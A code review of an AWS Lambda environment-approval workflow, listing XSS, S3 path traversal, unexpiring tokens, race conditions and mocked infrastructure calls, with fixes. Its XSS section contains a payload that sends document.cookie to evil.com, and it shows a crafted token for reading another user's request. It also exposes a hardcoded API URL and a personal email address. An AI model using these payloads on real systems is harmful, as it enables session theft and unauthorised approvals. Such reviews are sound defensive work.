# Code Review — Environment Approval Workflow

Reviewed across four dimensions: **Security**, **Implementation / Correctness**, **Feasibility / Production Readiness**, and **Cost / Operations**.

---

## Security Issues

### 1. HTML Injection / XSS in All Three Email Builders
**Severity: Critical** | `parser:269` · `executor:338` · `stop-notifier:184`

`original_body` is carefully escaped in `parser/lambda_function.py` at line 72:

```python
escaped_body = original_body.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
```

But `requester`, `sender`, `subject`, `start_time`, and `end_time` are all interpolated raw into HTML f-strings in every email builder across all three files. `sender` and `subject` come directly from SES mail headers — fully attacker-controlled.

**Failure scenario:** A crafted `Subject: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` executes JavaScript in the DevOps engineer's webmail client when they open the approval email. Python's `html` module is never imported in any file.

**Fix:** Wrap every user-controlled value with `html.escape()` before interpolation.

```python
from html import escape

# In every build_*_email_html function:
<span class="meta-value">{escape(requester)}</span>
<span class="meta-value">{escape(subject)}</span>
```

---

### 2. S3 Path Traversal via Unvalidated Token in Backward-Compat Fallback
**Severity: Critical** | `executor:460-464`

The `token` query parameter is used as a raw S3 key in the legacy fallback with no format validation:

```python
request_key = f"approvals/pending/{token}.json"
try:
    obj = s3.get_object(Bucket='env-approval-requests', Key=request_key)
except ClientError as exc:
    ...
    obj = s3.get_object(Bucket='env-approval-requests', Key=token)  # raw token — no validation
```

**Failure scenario:** An attacker supplies `?token=approvals/pending/victim-uuid.json`. The primary lookup (`approvals/pending/approvals/pending/victim-uuid.json`) returns NoSuchKey, and the fallback reads `approvals/pending/victim-uuid.json` — a valid existing object. The attacker can then approve or deny a different user's pending request. Requires knowing a valid token (e.g., from a forwarded email).

**Fix:** Validate the token is a UUID before any S3 access, and remove or tightly scope the fallback.

```python
import re

UUID4_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$')

if not token or not UUID4_RE.fullmatch(token):
    return {'statusCode': 400, 'body': 'Invalid token'}
```

---

### 3. Approval Links Are State-Changing GETs — Mail Pre-Fetchers Can Auto-Approve
**Severity: High** | `parser:376-377`

Both approve and deny URLs are plain GET links embedded as `<a href>` buttons:

```python
approve_url = f"{base_url}?token={token}&action=approve"
deny_url    = f"{base_url}?token={token}&action=deny"
```

The executor commits the approval irreversibly on the first GET — no confirmation step, no CSRF protection.

**Failure scenario:** Corporate email security gateways (Microsoft Defender SafeLinks, Proofpoint URL Defense) pre-fetch every URL in incoming emails during malware scanning. If the DevOps engineer's email passes through such a gateway, the request may be approved or denied before they open the email. The idempotency guard prevents reversal — whichever URL the gateway hits first wins permanently.

**Fix:** Change the approval flow to a two-step pattern. The GET link should render a confirmation page; the actual action should require a POST.

---

### 4. Approval Tokens Never Expire
**Severity: Medium** | `parser:358-373`

The S3 JSON object has no `issued_at` field and no TTL. The executor only checks `status == 'pending'` — never the age of the request.

**Failure scenario:** An approval email sitting in an archive, a shared inbox, or a forwarded email thread remains fully actionable indefinitely. A stale request for a one-night test environment can be approved months later.

**Fix:** Add `issued_at` to the stored JSON and reject tokens older than a policy window (e.g., 48 hours) in the executor.

```python
# parser — store timestamp
"issued_at": datetime.utcnow().isoformat()

# executor — check age
from datetime import datetime, timedelta, timezone
issued_at = datetime.fromisoformat(request.get('issued_at', '2000-01-01'))
if datetime.now(timezone.utc) - issued_at.replace(tzinfo=timezone.utc) > timedelta(hours=48):
    return {'statusCode': 410, 'body': 'Approval link has expired'}
```

---

## Implementation / Correctness Issues

### 5. Non-Atomic Idempotency Guard — Race Condition
**Severity: High** | `executor:457-476`

The check-read-then-write pattern on S3 is not atomic. S3 has no compare-and-swap:

```python
# Read
obj = s3.get_object(...)
request = json.loads(obj['Body'].read())
current_status = request.get('status', 'pending')

if current_status != 'pending':          # <-- guard
    return already_processed_page

# ... do work ...

request['status'] = 'approved'
s3.put_object(...)                        # <-- write (no ConditionExpression)
```

**Failure scenario:** Two simultaneous Lambda invocations (double-click, API Gateway retry, or email pre-fetch parallel requests) both read `status='pending'`, both pass the guard, and both proceed. Result: two approval emails sent, environments started twice, and the second EventBridge schedule silently swallowed by `ConflictException` — leaving environments running indefinitely with no stop schedule.

**Fix:** Use DynamoDB conditional writes as the atomic gate instead of S3. Create a DynamoDB item per token and use `ConditionExpression='attribute_not_exists(#s) OR #s = :pending'` to make the transition atomic.

---

### 6. `json.loads` on AI Output Has No Exception Handler
**Severity: High** | `parser:56`

```python
text = response.choices[0].message.content.strip()
# ... markdown fence stripping ...
return json.loads(text)   # no try/except anywhere in the call stack
```

The call site at line 350 also has no `try/except`. SES Lambda invocations are fire-and-forget with no automatic retry.

**Failure scenario:** LLM output truncated at the 500-token limit produces partial JSON. Any non-English input, model irregularity, or Groq service issue can produce non-JSON text. `json.JSONDecodeError` propagates unhandled; the email request is permanently and silently dropped with no error surfaced.

**Fix:**

```python
try:
    parsed = parse_email_with_ai(body, sender, subject)
except Exception as exc:
    print(f"AI parse failed: {exc}. Falling back to defaults.")
    parsed = {}

# Then use .get() with safe defaults for every field (which the code already does)
```

---

### 7. S3 Status Written Before SES Email Sent
**Severity: High** | `executor:551-564`

```python
request['status'] = 'approved'
s3.put_object(...)          # line 552 — status committed

email_body = build_approved_email_html(...)
ses.send_email(...)          # line 564 — if this throws, approval is lost
```

**Failure scenario:** If SES raises (sandbox restriction, throttling, unverified recipient, service outage), the Lambda exits with `status='approved'` already committed. Every future click of the approval link returns "already processed." The requester never receives confirmation and there is no observable error.

**Fix:** Send the email first, then commit the status. If the email fails, the link remains actionable and the approver can retry.

---

### 8. `start_time` Is Cosmetic — Environments Start Immediately on Approval
**Severity: High** | `executor:492-499`

The AI extracts `start_time` and it is stored and displayed in emails, but the executor's approve branch runs immediately when the button is clicked:

```python
if action == 'approve':
    started = []
    for tier in tiers:
        for service in services:
            started.append(f"{tier.upper()} / {service.upper()}")
    # ↑ runs immediately — no scheduler for start_time
```

An EventBridge schedule is only created for `end_time`. There is no corresponding start-time schedule.

**Failure scenario:** A developer emails "start QA at 8 PM, stop at 11 PM." DevOps approves at 2 PM. Environments start at 2 PM, not 8 PM. The confirmation email shows "Start Time: 8:00 PM" — which is misleading.

**Fix:** Either create a matching EventBridge start-time schedule, or document clearly in the UI and README that environments start immediately on approval (not at `start_time`), and treat `start_time` as advisory context only.

---

### 9. All Infrastructure Start and Stop Is Mocked — `lambda_client` Is Undefined
**Severity: High** | `executor:497-498`

```python
# Uncomment when real Lambdas are ready:
# lambda_client.invoke(FunctionName=f'start-{service}-{tier.lower()}', InvocationType='Event')
```

`lambda_client` is never declared anywhere in the executor file. The stop-notifier sends an email but issues no AWS API calls to EC2, RDS, or ECS. Uncommenting the line above would immediately raise `NameError` at runtime.

**Failure scenario:** The system approves requests, sends confirmation emails saying "DEV / EC2 — Started", and sends stop notices — but no AWS resource is ever touched. This is a complete notification system with no infrastructure control.

**Fix (pre-production checklist):**
1. Add `lambda_client = boto3.client('lambda')` to the executor
2. Create one Lambda function per service/tier (e.g., `start-ec2-dev`, `start-rds-qa`)
3. Build actual EC2/RDS/ECS control logic in those functions
4. Add a matching `lambda_client.invoke(...)` for the stop flow in the stop-notifier

---

### 10. Scheduler Failure Is Silently Swallowed After Environments Start
**Severity: Medium** | `executor:546-547`

```python
except Exception as exc:
    print(f"Failed to create stop scheduler: {exc}")
    # execution continues — no error returned
```

**Failure scenario:** If the IAM role is misconfigured, the ARN is wrong, or EventBridge is throttling, the scheduler is never created. The code proceeds to mark the request `approved` and sends a confirmation email stating the end time. No stop will ever be triggered. No alert, no notification, and no error returned to the approver.

**Fix:** At minimum, surface scheduler creation failure in the confirmation email (e.g., add a warning note). Ideally, use an SNS alarm or a CloudWatch metric filter on the error log pattern.

---

### 11. Stop Scheduled on Wrong Day When Approved After End Time Has Passed
**Severity: Medium** | `executor:9-23`

```python
def next_occurrence_from_end_time(end_time, timezone_name):
    parsed = datetime.strptime(end_time.strip(), "%I:%M %p")
    ...
    if run_local <= now_local:
        run_local = run_local + timedelta(days=1)   # rolls to tomorrow
    return run_local
```

The function has no date context — only a wall-clock time.

**Failure scenario:** A request is approved at 11:50 PM for `end_time` of `"11:00 PM"`. That moment has already passed, so the function adds one day — the stop fires 23+ hours later. Similarly, a request made on a Friday evening for Saturday night's environments would schedule the stop on the next occurrence of that time, which could be Saturday or Sunday depending on approval time.

**Fix:** Change `end_time` to store an absolute ISO-8601 datetime (with date) rather than a bare time string. Update the parser prompt to extract or infer the intended date.

---

### 12. `end_time='Immediately'` Returns Raw Text 400 — Request Becomes Permanently Unapprovable
**Severity: Medium** | `executor:486-490`

```python
if action == 'approve' and end_time.strip().lower() in ('', 'not specified', 'immediately'):
    return {
        'statusCode': 400,
        'body': 'end_time is required for approval scheduling'
    }
```

**Failure scenario:** A developer emails "I need the dev environment immediately for a hotfix." The parser maps "immediately" to the string `'Immediately'` (per its prompt at line 30). The approval email is sent correctly. The DevOps engineer clicks Approve and sees a raw 400 text response in their browser — no HTML page, no guidance. The requester receives no response. The request stays `pending` but the approver has no way to action it through the UI.

**Fix:** Either allow approvals with no end_time (skip scheduler creation) or return a styled HTML error page explaining the issue and suggesting the requester resubmit with an explicit end time.

---

## Cost / Operations Issues

### 13. Raw Emails and Approval JSONs Accumulate in S3 Forever
**Severity: Low** | `parser:333-337`

The parser reads the raw email from S3 but never deletes it. Approval JSONs in `approvals/pending/` are never removed after completion. Both prefixes grow without bound.

**Fix:** Call `s3.delete_object` after successful parsing, or add an S3 Lifecycle rule:

```json
{
  "Rules": [
    { "Prefix": "raw-emails/", "Expiration": { "Days": 7 } },
    { "Prefix": "approvals/pending/", "Expiration": { "Days": 90 } }
  ]
}
```

---

### 14. API Gateway URL and DevOps Email Are Hardcoded in Source
**Severity: Low** | `parser:375` · `parser:385`

```python
base_url    = "https://i7ohzc1hd1.execute-api.ap-south-1.amazonaws.com/approve"
...
Destination={'ToAddresses': ['simaakniyaz@gmail.com']}
```

The executor already reads `DEVOPS_TEAM_EMAIL` from an environment variable (line 504), making the two Lambdas inconsistent. If the API Gateway URL changes or the approver's email changes, the Lambda must be redeployed.

**Fix:** Move both to environment variables in the parser Lambda:

```python
base_url   = os.environ['APPROVAL_BASE_URL']
admin_email = os.environ['DEVOPS_APPROVAL_EMAIL']
```

---

## Summary

| # | Severity | Category | Location | Issue |
|---|---|---|---|---|
| 1 | Critical | Security | `parser:269`, `executor:338`, `stop-notifier:184` | HTML injection in all email builders |
| 2 | Critical | Security | `executor:464` | S3 path traversal via unvalidated fallback token |
| 3 | High | Security | `parser:376` | GET approval links auto-triggered by mail scanner pre-fetchers |
| 4 | High | Correctness | `executor:457` | Non-atomic TOCTOU race on approval idempotency guard |
| 5 | High | Correctness | `parser:56` | Unhandled `json.loads` silently drops requests on AI parse failure |
| 6 | High | Correctness | `executor:552` | S3 status committed before SES email — SES failure = silent no-op |
| 7 | High | Feasibility | `executor:492` | `start_time` is cosmetic; environments start immediately on approval |
| 8 | High | Feasibility | `executor:497` | All infra start/stop is mocked; `lambda_client` is undefined |
| 9 | Medium | Security | `parser:358` | Approval tokens have no expiry — links are valid forever |
| 10 | Medium | Correctness | `executor:546` | Scheduler failure silently swallowed; no auto-stop created |
| 11 | Medium | Correctness | `executor:9` | Stop scheduled on wrong day when approved after end time passes |
| 12 | Medium | Correctness | `executor:486` | `end_time='Immediately'` returns raw 400 text; request permanently blocked |
| 13 | Low | Cost | `parser:333` | Raw emails and approval JSONs never deleted from S3 |
| 14 | Low | Ops | `parser:375, 385` | API Gateway URL and DevOps email hardcoded in source |

---

## Pre-Production Checklist

Before deploying to a live environment, the following must be addressed:

- [ ] **HTML-escape all user-controlled fields** in every email builder (`html.escape()`)
- [ ] **Validate token format** (UUID4 regex) before any S3 access; remove or scope the legacy fallback
- [ ] **Change approval flow to POST** with a confirmation landing page (defeats pre-fetch auto-approval)
- [ ] **Replace S3 idempotency guard** with DynamoDB conditional write for atomicity
- [ ] **Wrap AI parse call in try/except** to handle non-JSON LLM output gracefully
- [ ] **Reverse email/status write order** — send SES email before committing S3 status
- [ ] **Wire real Lambda invocations** for EC2/RDS/ECS start and stop (currently all mocked)
- [ ] **Add token expiry** (`issued_at` + executor age check)
- [ ] **Add S3 Lifecycle rules** for `raw-emails/` and `approvals/pending/`
- [ ] **Move hardcoded URL and email to environment variables** in the parser Lambda
- [ ] **Surface scheduler creation failure** in the confirmation email or via CloudWatch alarm
